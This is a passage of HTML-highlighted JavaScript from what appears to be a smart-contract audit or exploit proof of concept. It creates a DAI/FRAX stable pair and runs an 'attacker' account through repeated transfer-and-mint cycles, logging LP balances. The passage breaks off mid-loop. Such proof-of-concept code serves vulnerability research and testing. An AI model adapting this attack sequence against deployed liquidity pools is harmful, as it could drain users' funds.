class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// token1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// token0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edai\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// token1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Create a stable pair\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// The deployer of PairFactory is the owner and can create pairs\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreatePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceipt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enot\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eequal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econstants\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAddressZero\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Pair address should not be zero\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eattach\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`Pair Address: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`Token0: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e === \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() ? \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() : \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e)`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`Token1: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e === \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() ? \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() : \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e)`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumCycles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumCycles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`\u003c/span\u003e\u003cspan class=\"mtk6\"\u003e\\n\u003c/span\u003e\u003cspan class=\"mtk8\"\u003eCycle \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumCycles\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Attacker transfers MINT_AMOUNT of each token to the pair\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMINT_AMOUNT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMINT_AMOUNT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`  Transferred \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMINT_AMOUNT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e of \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e and \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e to pair.`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Attacker mints LP tokens\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emintTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emintReceipt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emintTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Find the Mint event to get actual minted liquidity amount (optional, for detailed logging)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// const mintEvent = mintReceipt.events.find(e =\u0026gt; e.event === \u0026#39;Mint\u0026#39;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// const mintedLP = mintEvent.args.liquidity; // This might not be the direct LP amount, depends on Pair event\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elpBalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`  Minted LP. Attacker LP Balance: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elpBalance\u003c/span\u003e\u003cspan 